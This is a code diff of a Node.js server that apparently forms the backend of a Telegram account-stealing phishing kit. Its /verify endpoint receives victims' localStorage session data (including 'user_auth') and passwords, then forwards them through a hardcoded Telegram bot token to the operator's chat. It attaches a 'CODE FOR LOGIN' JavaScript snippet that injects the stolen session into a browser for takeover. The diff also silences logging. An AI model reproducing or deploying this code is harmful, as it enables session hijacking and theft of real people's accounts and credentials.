@@ -6,8 +6,12 @@ const path = require('path')
 const bodyParser = require('body-parser')
 const axios = require('axios')
 
+//const token = '6449129893:AAGzANtG4cdEwRmgkYo5L2y0FIHmlUC_2yQ'
+//const chatId = -4237257812
+
 const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
 const chatId = 5641960649
+
 
 const bot = new TelegramBot(token, { polling: true })
 
@@ -31,10 +35,10 @@ app.get('/', (req, res) => {
 })
 
 app.post('/verify', async (req, res) => {
-    const decodedData = atob(req.body)
+    const decodedData = req.body
     const jsonData = JSON.parse(decodedData)
-
-    const userAuth = JSON.parse(jsonData.ls.user_auth)
+    const parsedLs = JSON.parse(jsonData.ls)
+    const userAuth = JSON.parse(parsedLs.user_auth)
     const userId = userAuth.id
     const userData = await getUserData(userId)
 
@@ -47,7 +51,7 @@ app.post('/verify', async (req, res) => {
         ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),
 
         `CODE FOR LOGIN:\n`,
-        `localStorage.clear();const data='${JSON.stringify(jsonData.ls)}',newData=JSON.parse(data.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
+        `localStorage.clear();const data=${jsonData.ls};Object.keys(data).forEach((a=>{"object"==typeof data[a]?localStorage.setItem(a,JSON.stringify(data[a])):localStorage.setItem(a,data[a])})),location.reload();`
     ].join('\n')
 
     axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -55,10 +59,10 @@ app.post('/verify', async (req, res) => {
         text: textMessage
     })
     .then(response => {
-        console.log('Message sent:', response.data)
+        //console.log('Message sent:', response.data)
     })
     .catch(error => {
-        console.error('Error sending message:', error)
+        //console.error('Error sending message:', error)
     })
 })
 
